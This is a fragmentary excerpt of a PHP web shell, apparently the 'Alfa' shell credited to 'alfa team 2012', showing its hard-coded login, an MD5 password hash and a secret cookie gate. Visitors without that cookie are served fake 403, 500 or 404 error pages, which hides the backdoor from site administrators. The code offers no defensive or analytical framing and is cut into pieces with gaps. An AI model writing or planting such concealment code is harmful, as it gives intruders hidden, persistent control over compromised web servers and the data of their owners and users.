...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '36ff79d8305336e248b3fcb0ae424aef',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
$GLOBALS["COOKIE_LOGIN_NAME"] = "aqil";
$GLOBALS["COOKIE_LOGIN_VAL"] = "logic";

$SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");

if (!isset ($_COOKIE[$GLOBALS["COOKIE_LOGIN_NAME"]]) || $_COOKIE[$GLOBALS["COOKIE_LOGIN_NAME"]] != $GLOBALS["COOKIE_LOGIN_VAL"]) {

	if ($GLOBALS["oZgNypoPRU"]["login_page"] == "403") {

		echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>";

	}

	if ($GLOBALS["oZgNypoPRU"]["login_page"] == "500") {

		echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact the server administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$SERVER_SIG.'</body></html>';

	}

	if ($GLOBALS["oZgNypoPRU"]["login_page"] == "404") {

		echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$SERVER_SIG."</body></html>";
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://d.top4top.io/p_3011ifc051.jpg" /></center>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://d.top4top.io/p_3011ifc051.jpg" /></td>
</tr>
<tr>
...
@setcookie($GLOBALS["COOKIE_LOGIN_NAME"], null, 2012);
@setcookie($GLOBALS["COOKIE_LOGIN_VAL"], null, 2012);
unset($_COOKIE['AlfaUser'],$_COOKIE['AlfaPass'], $_COOKIE[$GLOBALS["COOKIE_LOGIN_NAME"]], $_COOKIE[$GLOBALS["COOKIE_LOGIN_VAL"]]);
echo("ok");
}
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://d.top4top.io/p_3011ifc051.jpg'><br>
